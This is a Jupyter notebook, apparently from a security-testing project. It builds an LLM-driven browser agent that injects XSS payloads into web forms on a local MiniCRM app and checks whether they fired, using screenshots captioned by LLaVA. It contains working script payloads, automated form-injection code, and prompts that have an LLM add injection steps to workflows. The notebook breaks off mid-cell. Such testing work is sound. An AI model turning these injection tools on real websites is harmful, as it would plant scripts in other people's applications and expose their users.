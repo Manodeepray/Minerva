{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "190708ea",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "failed = {\"data/extracted_task_workflows/Workflow_1.md\":{'failed_steps':[1]},\"data/extracted_task_workflows/Workflow_2.md\":{'failed_steps':[]}}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c985c6cf",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "from bs4 import BeautifulSoup\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f5299c6",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "import os\n",
    "import shutil\n",
    "from rich.panel import Panel\n",
    "def copy_executable_workflow(workflow_path , executable_workflow_dir = \"./data/executable_workflows\" ):\n",
    "    workflow = workflow_path.split(\"/\")[-1]    \n",
    "    executable_workflow_path = os.path.join(executable_workflow_dir  , workflow )\n",
    "    shutil.copy(src=workflow_path , dst= executable_workflow_path)\n",
    "    return executable_workflow_path\n",
    "\n",
    "\n",
    "def clean_dir(executable_workflow_dir):\n",
    "    dir_ops_logs = []\n",
    "\n",
    "    if os.path.exists(executable_workflow_dir):\n",
    "        for filename in os.listdir(executable_workflow_dir):\n",
    "            file_path = os.path.join(executable_workflow_dir, filename)\n",
    "            try:\n",
    "                if os.path.isfile(file_path) or os.path.islink(file_path):\n",
    "                    os.unlink(file_path)\n",
    "                    dir_ops_logs.append(f\"[green]Deleted file:[/green] {file_path}\")\n",
    "                elif os.path.isdir(file_path):\n",
    "                    shutil.rmtree(file_path)\n",
    "                    dir_ops_logs.append(f\"[green]Deleted folder:[/green] {file_path}\")\n",
    "            except Exception as e:\n",
    "                dir_ops_logs.append(f\"[red]Failed to delete {file_path}. Reason: {e}[/red]\")\n",
    "    else:\n",
    "        os.makedirs(executable_workflow_dir)\n",
    "        dir_ops_logs.append(f\"[cyan]Created directory:[/cyan] {executable_workflow_dir}\")\n",
    "\n",
    "    dir_panel = Panel(\"\\n\".join(dir_ops_logs) or \"[yellow]No existing files to delete[/yellow]\",\n",
    "                      title=\"🗂️ Directory Cleanup\", border_style=\"magenta\")\n",
    "\n",
    "\n",
    "\n",
    "def get_executable_workflows(failed , executable_workflow_dir = \"./data/executable_workflows\"):\n",
    "\n",
    "    clean_dir(executable_workflow_dir)\n",
    "    executable_workflows = []\n",
    "\n",
    "    for k , _ in failed.items():\n",
    "        if len(failed[k][\"failed_steps\"]) == 0:\n",
    "            \n",
    "            k = copy_executable_workflow(k)\n",
    "            \n",
    "            executable_workflows.append(k)\n",
    "\n",
    "\n",
    "\n",
    "    return executable_workflows\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42712b98-639a-488f-b6d5-a229f3344176",
   "metadata": {
    "scrolled": true,
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "workflow_path = get_executable_workflows(failed)[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9586c11",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "# copy_executable_workflow(workflow_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "81ac8225",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "workflow_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c5e3f97-607b-4b1d-b351-d2950cc73b9c",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "def parse_form_fields(html):\n",
    "    soup = BeautifulSoup(html, \"html.parser\")\n",
    "    inputs = soup.find_all(['input', 'textarea'])\n",
    "\n",
    "    # Collect fields with name and type\n",
    "    field_info = []\n",
    "    for tag in inputs:\n",
    "        name = tag.get(\"name\")\n",
    "        if name:\n",
    "            field_type = tag.get(\"type\", \"text\")  # default to text if not specified\n",
    "            tag_type = tag.name\n",
    "            field_info.append({\"name\": name, \"type\": field_type, \"tag\": tag_type})\n",
    "    return field_info\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ec8101e0-6d58-4839-9b86-f6a090386099",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "async def fill_form_fields(page, values: dict):\n",
    "    \"\"\"\n",
    "    Fill out and submit a form using parsed field names and user-provided values.\n",
    "    Args:\n",
    "        page: Pyppeteer page object\n",
    "        values: Dict of field names and their values\n",
    "    \"\"\"\n",
    "    \n",
    "    \n",
    "    xss_payload = \"<script>alert('XSS')</script>\"\n",
    "    \n",
    "    for field_name, field_value in values.items():\n",
    "        \n",
    "        \n",
    "        field_value = xss_payload \n",
    "        selector = f'input[name=\"{field_name}\"], textarea[name=\"{field_name}\"], select[name=\"{field_name}\"]'\n",
    "        print(f\"Filling: {selector} -> {field_value}\")\n",
    "        try:\n",
    "            await page.waitForSelector(selector, timeout=2000)\n",
    "\n",
    "            # Clear the input value using evaluate safely\n",
    "            await page.evaluate(\n",
    "                \"\"\"(selector) => {\n",
    "                    const el = document.querySelector(selector);\n",
    "                    if (el) el.value = \"\";\n",
    "                }\"\"\",\n",
    "                selector\n",
    "            )\n",
    "\n",
    "            # Handle <select> separately if needed\n",
    "            tag_name = await page.evaluate(\n",
    "                \"\"\"(selector) => {\n",
    "                    const el = document.querySelector(selector);\n",
    "                    return el ? el.tagName.toLowerCase() : null;\n",
    "                }\"\"\",\n",
    "                selector\n",
    "            )\n",
    "\n",
    "            if tag_name == \"select\":\n",
    "                await page.select(selector, field_value)\n",
    "            else:\n",
    "                await page.type(selector, field_value)\n",
    "\n",
    "        except Exception as e:\n",
    "            print(f\"⚠️ Failed to fill {field_name}: {e}\")\n",
    "\n",
    "    # Try to click the submit button\n",
    "    try:\n",
    "        submit_selectors = [\n",
    "            'form button[type=\"submit\"]',\n",
    "            'form input[type=\"submit\"]',\n",
    "            'button[type=\"submit\"]',\n",
    "            'input[type=\"submit\"]'\n",
    "        ]\n",
    "        for submit_selector in submit_selectors:\n",
    "            try:\n",
    "                await page.waitForSelector(submit_selector, timeout=1000)\n",
    "                await page.click(submit_selector)\n",
    "                await page.waitForNavigation(timeout=5000)\n",
    "                print(\"✅ Form submitted.\")\n",
    "                return \"✅ Form submitted.\"\n",
    "            except:\n",
    "                continue\n",
    "        return \"⚠️ No submit button found.\"\n",
    "    except Exception as e:\n",
    "        return f\"⚠️ Failed to submit form: {e}\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3a6e8c7-9914-4ef5-8999-bf87cc0f19c4",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "async def XSS_injection_tool(state: dict, form_html: str, values: dict = None):\n",
    "    \"\"\"\n",
    "    Fills out a form with an XSS payload (non-email fields) and submits it.\n",
    "    Args:\n",
    "        state: LangGraph agent state with a Puppeteer page\n",
    "        form_html: HTML string of the form\n",
    "        values: Optional dict to override the payloads\n",
    "    \"\"\"\n",
    "    fields = parse_form_fields(form_html)\n",
    "    filtered_values = {k: v for k, v in values.items() if k in fields}\n",
    "    \n",
    "    result = await fill_form_fields(state[\"page\"], filtered_values)\n",
    "    state[\"last_action\"] = result\n",
    "    return state\n",
    "\n",
    "# state = await XSS_injection_tool.arun({\n",
    "#     \"state\": state,\n",
    "#     \"form_html\": form_html,\n",
    "#     \"values\": values\n",
    "# })\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e2fae1e-2cea-4dab-8353-9ca4dcb15554",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "workflow_path = \"data/extracted_task_workflows/Workflow_3.md\"\n",
    "\n",
    "with open( workflow_path,\"r\") as f:\n",
    "    workflow = f.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "978c2bc2-7d52-443a-b574-fd636435ad15",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "workflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "97f73fa9-f5c1-4c72-9430-72eb5e04183e",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "import llm_bridge\n",
    "llm = llm_bridge.Bridge()\n",
    "\n",
    "visited_urls = ['http://127.0.0.1:5000/admin/settings', 'http://127.0.0.1:5000/contacts', 'http://127.0.0.1:5000/contacts/add', 'http://127.0.0.1:5000/dashboard', 'http://127.0.0.1:5000/tickets',\n",
    "'http://127.0.0.1:5000/tickets/add']\n",
    "\n",
    "\n",
    "prompt = f\"\"\"You are an webapp vulnerability security agent .\n",
    "you have 2 tools one to inject XSS acript payload into html forms and one to check_the_XSS alert in the urls.. \n",
    "now you have the workflow for a successful task , all the links of a website and the tools.\n",
    "\n",
    "YOUR GOAL : update the workflow such that it includes the 2 tools to check for vulonerability.\n",
    "\n",
    "INSTRUCTIONS: \n",
    "1. Only write concise steps with the urls like the original workflow\n",
    "2. make sure to write after 'updated_workflow'\n",
    "3. No need to put submit form if filling form is already there ..\n",
    "4. if filling form NO need for further verification of input details\n",
    "5. if there is no html form filling not in workflow for xss exploit.. output only SKIP\n",
    "6. for observing xss exploit try to check multiple related urls \n",
    "7. The xss payload is '<script>  document.body.innerHTML = '<h1 style=\"color:red\">XSS WORKED</h1>';</script>'\n",
    "visited_urls\n",
    "= {visited_urls}\n",
    "old_workflow = {workflow}\n",
    "\n",
    "\n",
    "updated_workflow = \n",
    "\"\"\"\n",
    "\n",
    "\n",
    "\n",
    "response = llm.get_response(prompt = prompt)\n",
    "\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21b7f7b6-34ae-4866-9199-c11d7b5ad79d",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "exploit_workflow = response.choices[0].message.content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d840f382-121d-463f-88af-3fd588259013",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "exploit_workflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e329d383-544a-465b-b974-81ed84e22d09",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "wf={}\n",
    "# wf[\"task\"] = exploit_workflow.split(\"Workflow\")[0]\n",
    "\n",
    "exploit_workflow = exploit_workflow.replace(\"updated_workflow\" , \"\")\n",
    "wf[\"workflow_steps\"] = exploit_workflow.split(\"Step\")\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d03c072e-856b-4d4f-ba87-58e7677f42dc",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "wf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0b50d7c5-ba41-42f4-83af-0d9fed118d18",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "try:\n",
    "    from langchain.tools import tool\n",
    "except:\n",
    "    !uv pip install langchain\n",
    "# langgraph state variable (dict)\n",
    "\n",
    "state = {\n",
    "    \"page\" : None,  # Puppeteer page instance\n",
    "    \"home_url\": None,\n",
    "    \"curr_url\": None,\n",
    "    \"last_action\": None,\n",
    "    \"history\": [],\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fed3ca15-58f0-4d07-98b4-9ad8d96d9507",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "try:\n",
    "    from pyppeteer import launch\n",
    "except:\n",
    "    !uv pip install pyppeteer\n",
    "\n",
    "import asyncio"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6847868e-7138-4638-b23d-c30530d9bf57",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "try:\n",
    "    import langgraph\n",
    "except:\n",
    "    !uv pip install langgraph"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7ea8dac-0790-4b24-b06a-4c47969e9eab",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "home_url = \"http://127.0.0.1:5000/\"\n",
    "test_url = \"http://127.0.0.1:5000/contacts/add\"\n",
    " \n",
    "browser = await launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])\n",
    "\n",
    "page = await browser.newPage()\n",
    "await page.goto(test_url, {'waitUntil': 'networkidle2'})\n",
    "state['page'] = page\n",
    "\n",
    "\n",
    "state[\"home_url\"] = home_url\n",
    "state[\"curr_url\"] = page.url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e5d7bb6e",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "page.on('dialog', lambda dialog: asyncio.create_task(dialog.dismiss()))\n",
    "await page.goto(\"http://127.0.0.1:5000/contacts\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7fff5726",
   "metadata": {
    "scrolled": true,
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "await page.screenshot(path=\"xss.png\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9f94918-a6ef-4e44-ab6c-b76fb8ce9606",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "@tool\n",
    "async def navigate_to_link(state: dict, relative_url: str):\n",
    "    \"\"\"\n",
    "    Navigate to a selected link (relative path like '/dashboard')\n",
    "    Args:\n",
    "        state (dict): Must contain a Puppeteer page object in `state[\"page\"]`\n",
    "        relative_url (str): e.g. '/dashboard'\n",
    "    Returns:\n",
    "        dict: Updated state with last action\n",
    "    \"\"\"\n",
    "    page = state[\"page\"]\n",
    "    home_url = state[\"home_url\"]\n",
    "    page.on('dialog', lambda dialog: asyncio.create_task(dialog.dismiss()))\n",
    "\n",
    "    # Construct absolute URL\n",
    "    full_url = home_url.rstrip(\"/\") + relative_url\n",
    "\n",
    "    try:\n",
    "        await page.goto(full_url, {'waitUntil': 'networkidle2'})\n",
    "        state[\"curr_url\"] = full_url\n",
    "        state[\"last_action\"] = f\"✅ Navigated to {full_url}\"\n",
    "        return state\n",
    "    except Exception as e:\n",
    "        state[\"last_action\"] = f\"❌ Failed to navigate to {full_url}: {e}\"\n",
    "        return state\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0275453-d748-4dd0-85c5-a2fafc1a7239",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "\n",
    "@tool\n",
    "async def click_button_by_html(state: dict, html_string: str) -> dict:\n",
    "    \"\"\"\n",
    "    Extract button text from HTML and click it on the current page.\n",
    "    Args:\n",
    "        state (dict): Must contain a Puppeteer page object in `state[\"page\"]`\n",
    "        html_string (str): e.g. '<button type=\"submit\">Save Contact</button>'\n",
    "    Returns:\n",
    "        dict: Updated state with last action\n",
    "    \"\"\"\n",
    "    page = state[\"page\"]\n",
    "\n",
    "    # Extract visible text from the button HTML\n",
    "    try:\n",
    "        soup = BeautifulSoup(html_string, 'html.parser')\n",
    "        target_text = soup.get_text(strip=True)\n",
    "    except Exception as e:\n",
    "        state[\"last_action\"] = f\"❌ Failed to parse HTML: {e}\"\n",
    "        return state\n",
    "\n",
    "    # Search all clickable elements\n",
    "    try:\n",
    "        buttons = await page.querySelectorAll('button, input[type=\"button\"], input[type=\"submit\"], [onclick]')\n",
    "        \n",
    "        for button in buttons:\n",
    "            text = await page.evaluate('(el) => el.innerText || el.value || el.getAttribute(\"onclick\") || \"\"', button)\n",
    "            if text and target_text.lower() in text.strip().lower():\n",
    "                await button.click()\n",
    "                state[\"last_action\"] = f\"✅ Clicked button with text: {text.strip()}\"\n",
    "                return state\n",
    "        \n",
    "        state[\"last_action\"] = f\"❌ No button found with text: {target_text}\"\n",
    "        return state\n",
    "    except Exception as e:\n",
    "        state[\"last_action\"] = f\"❌ Error while clicking button: {e}\"\n",
    "        return state\n",
    "\n",
    "# await click_button_by_html(state , buttons)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "723b9999-d05a-461b-846e-be7d087fd1dc",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "def parse_form_fields(html):\n",
    "    soup = BeautifulSoup(html, \"html.parser\")\n",
    "    inputs = soup.find_all(['input', 'textarea'])\n",
    "    field_names = [tag.get(\"name\") for tag in inputs if tag.get(\"name\")]\n",
    "    return field_names\n",
    "    \n",
    "\n",
    "# use this to the the field values for prompt\n",
    "\n",
    "\n",
    "async def fill_form_fields(page, values: dict):\n",
    "    \"\"\"\n",
    "    Fill out and submit a form using parsed field names and user-provided values.\n",
    "    Args:\n",
    "        page: Pyppeteer page object\n",
    "        values: Dict of field names and their values\n",
    "    \"\"\"\n",
    "    for field_name, field_value in values.items():\n",
    "        # if field_name != \"email\":    \n",
    "        #     field_value = \"<script>alert('XSS')</script> \"\n",
    "\n",
    "\n",
    "        selector = f'input[name=\"{field_name}\"], textarea[name=\"{field_name}\"], select[name=\"{field_name}\"]'\n",
    "        print(f\"Filling: {selector} -> {field_value}\")\n",
    "        try:\n",
    "            await page.waitForSelector(selector, timeout=2000)\n",
    "\n",
    "            # Clear the input value using evaluate safely\n",
    "            await page.evaluate(\n",
    "                \"\"\"(selector) => {\n",
    "                    const el = document.querySelector(selector);\n",
    "                    if (el) el.value = \"\";\n",
    "                }\"\"\",\n",
    "                selector\n",
    "            )\n",
    "\n",
    "            # Handle <select> separately if needed\n",
    "            tag_name = await page.evaluate(\n",
    "                \"\"\"(selector) => {\n",
    "                    const el = document.querySelector(selector);\n",
    "                    return el ? el.tagName.toLowerCase() : null;\n",
    "                }\"\"\",\n",
    "                selector\n",
    "            )\n",
    "\n",
    "            if tag_name == \"select\":\n",
    "                await page.select(selector, field_value)\n",
    "            else:\n",
    "                await page.type(selector, field_value)\n",
    "\n",
    "        except Exception as e:\n",
    "            print(f\"⚠️ Failed to fill {field_name}: {e}\")\n",
    "\n",
    "    # Try to click the submit button\n",
    "    try:\n",
    "        submit_selectors = [\n",
    "            'form button[type=\"submit\"]',\n",
    "            'form input[type=\"submit\"]',\n",
    "            'button[type=\"submit\"]',\n",
    "            'input[type=\"submit\"]'\n",
    "        ]\n",
    "        for submit_selector in submit_selectors:\n",
    "            try:\n",
    "                await page.waitForSelector(submit_selector, timeout=1000)\n",
    "                await page.click(submit_selector)\n",
    "                await page.waitForNavigation(timeout=5000)\n",
    "                return \"✅ Form submitted.\"\n",
    "            except:\n",
    "                continue\n",
    "        return \"⚠️ No submit button found.\"\n",
    "    except Exception as e:\n",
    "        return f\"⚠️ Failed to submit form: {e}\"\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "de3cfd61-0de2-427f-8084-8e2352116bf9",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "@tool\n",
    "\n",
    "async def XSS_injection_tool(state: dict, form_html: str, values: dict = None):\n",
    "    \"\"\"\n",
    "    Fills out a form with an XSS payload to all non-email fields and submits it.\n",
    "    Args:\n",
    "        state: LangGraph agent state with a Puppeteer page\n",
    "        form_html: HTML string of the form\n",
    "        values: Optional dict to override the payloads\n",
    "        \n",
    "        vlaues format  = {  \n",
    "                            name:abc,\n",
    "                            email:xyv@mail.com ,\n",
    "                            notes: dummy note\n",
    "                            \n",
    "                        }\n",
    "    \"\"\"\n",
    "    # fields = parse_form_fields(form_html)\n",
    "    fields = values\n",
    "    filtered_values = {k: v for k, v in values.items() if k in fields}\n",
    "    print(f\"filtered_values : {filtered_values}\")\n",
    "    result = await fill_form_fields(state[\"page\"], filtered_values)\n",
    "    state[\"last_action\"] = result\n",
    "    return state\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36decc2d",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "# import asyncio\n",
    "\n",
    "# async def fill_form_fields(page, values: dict):\n",
    "#     \"\"\"\n",
    "#     Force-fill form fields with XSS payloads using Pyppeteer.\n",
    "#     \"\"\"\n",
    "#     for field_name in values:\n",
    "#         selector = f'input[name=\"{field_name}\"], textarea[name=\"{field_name}\"]'\n",
    "#         payload = \"<script>alert('XSS Attack!');</script>\"\n",
    "#         print(selector, payload)\n",
    "#         try:\n",
    "#             await page.waitForSelector(selector, timeout=2000)\n",
    "#             await page.evaluate(\n",
    "#                 \"\"\"(selector, value) => {\n",
    "#                     const el = document.querySelector(selector);\n",
    "#                     if (el) el.value = value;\n",
    "#                 }\"\"\",\n",
    "#                 selector,\n",
    "#                 payload\n",
    "#             )\n",
    "#             print(f\"✅ Injected payload into {field_name}\")\n",
    "#         except Exception as e:\n",
    "#             print(f\"⚠️ Failed to inject into {field_name}: {e}\")\n",
    "\n",
    "#     # Submit the form\n",
    "#     try:\n",
    "#         await page.click('button[type=\"submit\"], input[type=\"submit\"]')\n",
    "#         await asyncio.sleep(2)  # ⏳ Wait 2 seconds for JS/AJAX to run\n",
    "#         print(\"✅ Submit clicked (no navigation).\")\n",
    "#         return \"✅ Submit clicked (no navigation).\"\n",
    "#     except Exception as e:\n",
    "#         print(f\"⚠️ Failed to click submit: {e}\")\n",
    "#         return f\"⚠️ Failed to click submit: {e}\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ee405b4",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4cf61194",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "from PIL import Image\n",
    "import uuid\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7eff6cd",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "from transformers import AutoProcessor, LlavaOnevisionForConditionalGeneration\n",
    "import torch , torchvision"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07bbe42f",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "model_id = \"llava-hf/llava-onevision-qwen2-0.5b-ov-hf\"\n",
    "model = LlavaOnevisionForConditionalGeneration.from_pretrained(\n",
    "    model_id,\n",
    "    torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32,\n",
    "    low_cpu_mem_usage=True,\n",
    "    device_map=\"auto\",\n",
    ")\n",
    "processor = AutoProcessor.from_pretrained(model_id)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3af3ef9b-0302-43eb-b574-75d9f3fcc1a7",
   "metadata": {},
   "outputs": [],
   "source": [
    "def analyze_xss_image(image_path: str, question: str = \"What text do you see in the picture ?\"):\n",
    "    \"\"\"Uses the LLaVA vision-language model to analyze the screenshot.\"\"\"\n",
    "    image = Image.open(image_path).convert(\"RGB\")\n",
    "\n",
    "    # Chat template for multimodal input\n",
    "    conversation = [\n",
    "        {\n",
    "            \"role\": \"user\",\n",
    "            \"content\": [\n",
    "                {\"type\": \"text\", \"text\": question},\n",
    "                {\"type\": \"image\"}\n",
    "            ]\n",
    "        }\n",
    "    ]\n",
    "\n",
    "    prompt = processor.apply_chat_template(conversation, add_generation_prompt=True)\n",
    "    inputs = processor(text=prompt, images=image, return_tensors=\"pt\").to(model.device)\n",
    "\n",
    "    output = model.generate(**inputs, max_new_tokens=100)\n",
    "    decoded = processor.batch_decode(output, skip_special_tokens=True)[0]\n",
    "    print(decoded)\n",
    "    return decoded"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa3d3192",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "# print(analyze_xss_image(\"xss.png\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8eca4b4",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "from pprint import pprint\n",
    "def check_with_llm(caption):\n",
    "    print(caption)\n",
    "    json_xss = \"\"\"{'xss_triggered':True or False}\"\"\"\n",
    "\n",
    "\n",
    "    json_xss_false = {'xss_triggered':False}\n",
    "\n",
    "    xss_verification_prompt = f\"\"\"\n",
    "           you are an smart tool that takes the visual caption of a web page after visiting a potentially XSS-injected URL:\n",
    "\n",
    "        your job is to:\n",
    "        1. check if the xss payload worked , payload = '<script>  document.body.innerHTML = '<h1 style=\"color:red\">XSS WORKED</h1>';</script>'\n",
    "\n",
    "        2. if payload worked successfully the ouput the  json \n",
    "        for example if caption : \n",
    "        What text do you see in the picture ?assistant\n",
    "        The text in the picture reads \"XSS WORKED\". it worked\n",
    "        3.if in the caption there is any mention of xss in red , or xss then injection worked  , otherwise it did not work \n",
    "\n",
    "        INSTRUCTION\n",
    "        THINK  THEN RETURN THE DICTIONARY with value True if it workd and False if it did not work\n",
    "\n",
    "\n",
    "        CAPTION : {caption}\n",
    "\n",
    "        output will be in the format\n",
    "        {json_xss}\n",
    "\n",
    "        \n",
    "\n",
    "\n",
    "    \"\"\"\n",
    "    pprint(xss_verification_prompt)\n",
    "    llm = llm_bridge.Bridge()\n",
    "    response = llm.get_response(prompt = xss_verification_prompt)\n",
    "\n",
    "    response = response.choices[0].message.content\n",
    "\n",
    "    print(response)\n",
    "    return response\n",
    "\n",
    "\n",
    "    \n",
    "# caption = \"\"\"user \n",
    "# What text do you see in the picture ?assistant\n",
    "# The image shows a screenshot of a user interface for a dashboard named \"MiniCRM Dashboard.\" \n",
    "# The interface is designed to be user-friendly, with a clean layout and a simple color scheme.\n",
    "# At the top, there are tabs labeled \"Dashboard,\" \"Contacts,\" \"Tickets,\" and \"Admin,\" suggesting that the dashboard offers various sections\n",
    "# for managing different aspects of the MiniCRM system.\n",
    "# Below the tabs, there is a welcome message that reads \"Welcome to the MiniCRM Dashboard.\" The main content area of the\"\"\"\n",
    "# result = get_json_from_response(check_with_llm(caption))\n",
    "# result['xss_triggered']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1d37474",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "import re\n",
    "import ast\n",
    "\n",
    "def get_json_from_response(response):\n",
    "    match = re.search(r\"(\\{.*?\\})\", response)\n",
    "    if match:\n",
    "        dict_string = match.group(1)\n",
    "        print(\"Raw match:\", dict_string)\n",
    "\n",
    "        try:\n",
    "            # Parse safely using ast.literal_eval\n",
    "            data = ast.literal_eval(dict_string)\n",
    "            print(\"Extracted dictionary:\", data)\n",
    "            return data\n",
    "\n",
    "        except Exception as e:\n",
    "            print(f\"Error parsing dict: {e}\")\n",
    "    else:\n",
    "        print(\"No dictionary found in the string.\")\n",
    "\n",
    "    return None\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c9c790c",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "def verify_xss( image_path):\n",
    "    \n",
    "\n",
    "\n",
    "    caption = analyze_xss_image(image_path)\n",
    "    response = check_with_llm(caption = caption)\n",
    "\n",
    "    result = get_json_from_response(response)\n",
    "\n",
    "\n",
    "    \n",
    "    \n",
    "    return result\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bdb124fa",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "# xss_triggered = False\n",
    "# screenshot_path  = \"./output/xss_proof.png\"\n",
    "# await page.screenshot(path= screenshot_path)\n",
    "\n",
    "# result = verify_xss(image_path = screenshot_path)\n",
    "\n",
    "# result = \"✅ XSS alert triggered!\" if (result['xss_triggered'] == True) else \"❌ No XSS alert detected.\"\n",
    "# print(result)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "350847c4-ebea-4afb-ba68-ade1bc338870",
   "metadata": {},
   "outputs": [],
   "source": [
    "page.url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75e02e75-609d-44b1-b869-3d4cbb90ffeb",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "from langchain.tools import tool  \n",
    "\n",
    "\n",
    "@tool\n",
    "async def check_XSS_alert(state: dict) -> str:\n",
    "    \"\"\"\n",
    "    Checks if an alert (e.g., from an XSS payload) was triggered on the page.\n",
    "\n",
    "    Args:\n",
    "        state: A dictionary containing Playwright page context.\n",
    "\n",
    "    Returns:\n",
    "        str: \"✅ XSS alert triggered!\" if xss was observed,\n",
    "             otherwise \"❌ No XSS alert detected.\"\n",
    "    \"\"\"\n",
